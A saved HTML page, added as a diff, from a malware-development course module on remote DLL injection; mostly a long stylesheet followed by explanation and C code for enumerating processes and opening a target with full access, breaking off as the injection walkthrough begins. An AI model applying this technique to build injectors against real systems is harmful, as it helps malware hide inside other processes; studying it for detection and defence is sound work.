@@ -1,0 +1,903 @@
+
+<!-- saved from url=(0179)file:///D:/Data2/Telegram%20Desktop/MalDevAcademy/MALWARE%208b74ccffb7e64efea30e3da4d919418d/28%20Process%20Injection%20-%20DLL%20Injection%20673245a70556420cb999c1f1cc2723a9.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Process Injection - DLL Injection</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="673245a7-0556-420c-b999-c1f1cc2723a9" class="page sans"><header><h1 class="page-title"><a href="https://maldevacademy.com/modules/28"><strong> Process Injection - DLL Injection</strong></a></h1></header><div class="page-body"><h2 id="972c488b-e6cb-4b84-8a10-71ea8f2b2d35" class=""><strong>Process Injection - DLL Injection</strong></h2><h3 id="d833641d-6432-46c8-b805-ebde17c8ab19" class=""><strong>Introduction</strong></h3><p id="00f4d8fd-22fd-4b04-9562-2c59a0525928" class="">This module will demonstrate a similar method to the one that was previously shown with the local DLL injection except it will now be performed on a remote process.</p><h3 id="6a478b90-e689-45a0-9948-37544b9bc4ef" class=""><strong>Enumerating Processes</strong></h3><p id="dd2f851d-7348-4afe-84ea-b08a4a0cd8d7" class="">Before being able to inject a DLL into a process, a target process must be chosen. Therefore the first step to remote process injection is usually to enumerate the running processes on the machine to know of potential target processes that can be injected. The process ID (or PID) is required to open a handle to the target process and allow the necessary work to be done on the target process.</p><p id="40984bc4-db3e-4e6e-aaba-9e410ffc1186" class="">This module creates a function that performs process enumeration to determine all the running processes. The function&nbsp;<code>GetRemoteProcessHandle</code>&nbsp;will be used to perform an enumeration of all running processes on the system, opening a handle to the target process and returning both PID and handle to the process.</p><h3 id="cd5e3b20-66fa-4bb0-ac7a-e80ad5d2abff" class=""><strong>CreateToolhelp32Snapshot</strong></h3><p id="a5d46323-be3a-4807-acb6-00eb7967a984" class="">The code snippet starts by using&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot</a>&nbsp;with the&nbsp;<code>TH32CS_SNAPPROCESS</code>&nbsp;flag for its first parameter, which takes a snapshot of all processes running on the system at the moment the function is executed.</p><pre id="90a63350-e439-4fb6-b871-c7bb05133534" class="code code-wrap"><code>// Takes a snapshot of the currently running processes
+hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+</code></pre><h3 id="42b65eba-0f81-471c-bb58-0dd134907a37" class=""><strong>PROCESSENTRY32 Structure</strong></h3><p id="a22a9d42-dc3d-4f24-b07b-bd81aee42096" class="">Once the snapshot is taken,&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first">Process32First</a>&nbsp;is used to get information for the first process in the snapshot. For all the remaining processes in the snapshot,&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next">Process32Next</a>&nbsp;is used.</p><p id="6d3171d2-9e5c-4045-b6bd-ac09c6b8c979" class="">Microsoft's documentation states that both&nbsp;<code>Process32First</code>&nbsp;and&nbsp;<code>Process32Next</code>&nbsp;require a&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32">PROCESSENTRY32</a>&nbsp;structure to be passed in for their second parameter. After the struct is passed in, the functions will populate the struct with information about the process. The&nbsp;<code>PROCESSENTRY32</code>&nbsp;struct is shown below with comments beside the useful members of the struct that will be populated by these functions.</p><pre id="6ba59ed7-2d35-4801-9763-9b1a18a78c96" class="code code-wrap"><code>typedef struct tagPROCESSENTRY32 {
+  DWORD     dwSize;
+  DWORD     cntUsage;
+  DWORD     th32ProcessID;              // The process ID
+  ULONG_PTR th32DefaultHeapID;
+  DWORD     th32ModuleID;
+  DWORD     cntThreads;
+  DWORD     th32ParentProcessID;        // Process ID of the parent process
+  LONG      pcPriClassBase;
+  DWORD     dwFlags;
+  CHAR      szExeFile[MAX_PATH];        // The name of the executable file for the process
+} PROCESSENTRY32;
+</code></pre><p id="6b212e4a-38bf-4189-b722-d30998821167" class="">After&nbsp;<code>Process32First</code>&nbsp;or&nbsp;<code>Process32Next</code>&nbsp;populate the struct, the data can be extracted from the struct by using the dot operator. For example, to extract the PID use&nbsp;<code>PROCESSENTRY32.th32ProcessID</code>.</p><h3 id="c6de2319-8cd2-46a7-af9c-d25d37f55e08" class=""><strong>Process32First &amp; Process32Next</strong></h3><p id="7d4b842e-656e-484b-b52e-a0de285e1abf" class="">As previously mentioned,&nbsp;<code>Process32First</code>&nbsp;is used to get information for the first process and&nbsp;<code>Process32Next</code>&nbsp;for all the remaining processes in the snapshot using a do-while loop. The process name that's being searched for,&nbsp;<code>szProcessName</code>, is compared against the process name in the current loop iteration which is extracted from the populated structure,&nbsp;<code>Proc.szExeFile</code>. If there is a match then the process ID is saved and a handle is opened for that process.</p><pre id="8cc2bfd5-deaf-40cf-b5fd-b36ec0feac43" class="code code-wrap"><code>// Retrieves information about the first process encountered in the snapshot.
+if (!Process32First(hSnapShot, &amp;Proc)) {
+	printf("[!] Process32First Failed With Error : %d \n", GetLastError());
+	goto _EndOfFunction;
+}
+
+do {
+	// Use the dot operator to extract the process name from the populated struct
+	// If the process name matches the process we're looking for
+	if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
+		// Use the dot operator to extract the process ID from the populated struct
+		// Save the PID
+		*dwProcessId  = Proc.th32ProcessID;
+		// Open a handle to the process
+		*hProcess     = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
+		if (*hProcess == NULL)
+			printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
+
+		break; // Exit the loop
+	}
+
+// Retrieves information about the next process recorded the snapshot.
+// While a process still remains in the snapshot, continue looping
+} while (Process32Next(hSnapShot, &amp;Proc));
+</code></pre><h3 id="39cb63b1-6201-43b7-83c2-a41216598f70" class=""><strong>Process Enumeration - Code</strong></h3><pre id="20aa1873-8a31-434d-b2a5-826811830c6a" class="code code-wrap"><code>BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {
+
+	// According to the documentation:
+	// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
+	// If dwSize is not initialized, Process32First fails.
+	PROCESSENTRY32	Proc = {
+		.dwSize = sizeof(PROCESSENTRY32)
+	};
+
+	HANDLE hSnapShot = NULL;
+
+	// Takes a snapshot of the currently running processes
+	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+	if (hSnapShot == INVALID_HANDLE_VALUE){
+		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
+		goto _EndOfFunction;
+	}
+
+	// Retrieves information about the first process encountered in the snapshot.
+	if (!Process32First(hSnapShot, &amp;Proc)) {
+		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
+		goto _EndOfFunction;
+	}
+
+	do {
+		// Use the dot operator to extract the process name from the populated struct
+		// If the process name matches the process we're looking for
+		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
+			// Use the dot operator to extract the process ID from the populated struct
+			// Save the PID
+			*dwProcessId = Proc.th32ProcessID;
+			// Open a handle to the process
+			*hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
+			if (*hProcess == NULL)
+				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
+
+			break; // Exit the loop
+		}
+
+	// Retrieves information about the next process recorded the snapshot.
+	// While a process still remains in the snapshot, continue looping
+	} while (Process32Next(hSnapShot, &amp;Proc));
+
+	// Cleanup
+	_EndOfFunction:
+		if (hSnapShot != NULL)
+			CloseHandle(hSnapShot);
+		if (*dwProcessId == NULL || *hProcess == NULL)
+			return FALSE;
+		return TRUE;
+}
+
+</code></pre><h3 id="c66cd1c0-aead-40fa-920a-e2e1240508a8" class=""><strong>Microsoft's Example</strong></h3><p id="9380edae-c47d-450c-bed5-78083ad8d821" class="">Another process enumeration example is available for viewing&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes">here</a>.</p><h3 id="b9ee64e1-09a9-4ce7-98fa-c4855cdcd329" class=""><strong>Case Sensitive Process Name</strong></h3><p id="46a1b11a-c27f-4c0b-a7ec-cfb27f881e23" class="">The code snippet above contains one flaw that was overlooked which can lead to inaccurate results. The&nbsp;<code>wcscmp</code>&nbsp;function was used to compare the process names, but the case sensitivity was not taken into account which means&nbsp;<code>Process1.exe</code>&nbsp;and&nbsp;<code>process1.exe</code>&nbsp;will be considered two different processes.</p><p id="7ae12c82-c8bb-4838-b334-e0c2d1532323" class="">The code snippet below fixes this issue by converting the value in the&nbsp;<code>Proc.szExeFile</code>&nbsp;member to a lowercase string and then comparing it to&nbsp;<code>szProcessName</code>. Therefore,&nbsp;<code>szProcessName</code>&nbsp;must always be passed in as a lowercase string.</p><pre id="bf739883-2d0b-4914-858e-aeef81e16332" class="code code-wrap"><code>BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
+
+	// According to the documentation:
+	// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
+	// If dwSize is not initialized, Process32First fails.
+	PROCESSENTRY32	Proc = {
+		.dwSize = sizeof(PROCESSENTRY32)
+	};
+
+	HANDLE hSnapShot = NULL;
+
+	// Takes a snapshot of the currently running processes
+	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+	if (hSnapShot == INVALID_HANDLE_VALUE){
+		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
+		goto _EndOfFunction;
+	}
+
+	// Retrieves information about the first process encountered in the snapshot.
+	if (!Process32First(hSnapShot, &amp;Proc)) {
+		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
+		goto _EndOfFunction;
+	}
+
+	do {
+
+		WCHAR LowerName[MAX_PATH * 2];
+
+		if (Proc.szExeFile) {
+			DWORD	dwSize = lstrlenW(Proc.szExeFile);
+			DWORD   i = 0;
+
+			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);
+
+			// Converting each charachter in Proc.szExeFile to a lower case character
+			// and saving it in LowerName
+			if (dwSize &lt; MAX_PATH * 2) {
+
+				for (; i &lt; dwSize; i++)
+					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
+
+				LowerName[i++] = '\0';
+			}
+		}
+
+		// If the lowercase'd process name matches the process we're looking for
+		if (wcscmp(LowerName, szProcessName) == 0) {
+			// Save the PID
+			*dwProcessId = Proc.th32ProcessID;
+			// Open a handle to the process
+			*hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
+			if (*hProcess == NULL)
+				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
+
+			break;
+		}
+
+	// Retrieves information about the next process recorded the snapshot.
+	// While a process still remains in the snapshot, continue looping
+	} while (Process32Next(hSnapShot, &amp;Proc));
+
+	// Cleanup
+	_EndOfFunction:
+		if (hSnapShot != NULL)
+			CloseHandle(hSnapShot);
+		if (*dwProcessId == NULL || *hProcess == NULL)
+			return FALSE;
+		return TRUE;
+	}
+</code></pre><h3 id="f4ac09d7-6916-4588-b45d-5341fa63726b" class=""><strong>DLL Injection</strong></h3><p id="ed4a5cd1-306a-42eb-a56a-254d6dbd8fce" class="">A process handle to the target process has been successfully retrieved. The next step is to inject the DLL into the target process which will require the use of several Windows APIs that were previously used and some new ones.</p><ul id="80f45fb9-03c3-4c5e-b34b-4017afbc64b8" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a>&nbsp;- Similar to&nbsp;<code>VirtualAlloc</code>&nbsp;except it allows for memory allocation in a remote process.</li></ul><ul id="d59a391a-dc68-4858-8d5b-a44dc16bf710" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a>&nbsp;- Writes data to the remote process. In this case, it will be used to write the DLL's path to the target process.</li></ul><ul id="cee86a10-7ba8-4657-a5ef-8c0a73bc5645" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread</a>&nbsp;- Creates a thread in the remote process</li></ul><h3 id="61d18119-4849-41c0-9f82-ac9cb5072a67" class=""><strong>Code Walkthrough</strong></h3><p id="ce5cea75-a58a-4cd8-af70-808cb00dba1b" class="">This section will walk through the DLL injection code (shown below). The function&nbsp;<code>InjectDllToRemoteProcess</code>&nbsp;takes two arguments:</p><ol type="1" id="995a082e-9b10-4a36-bac2-aea311a68f92" class="numbered-list" start="1"><li>Process Handle - This is a HANDLE to the target process which will have the DLL injected into 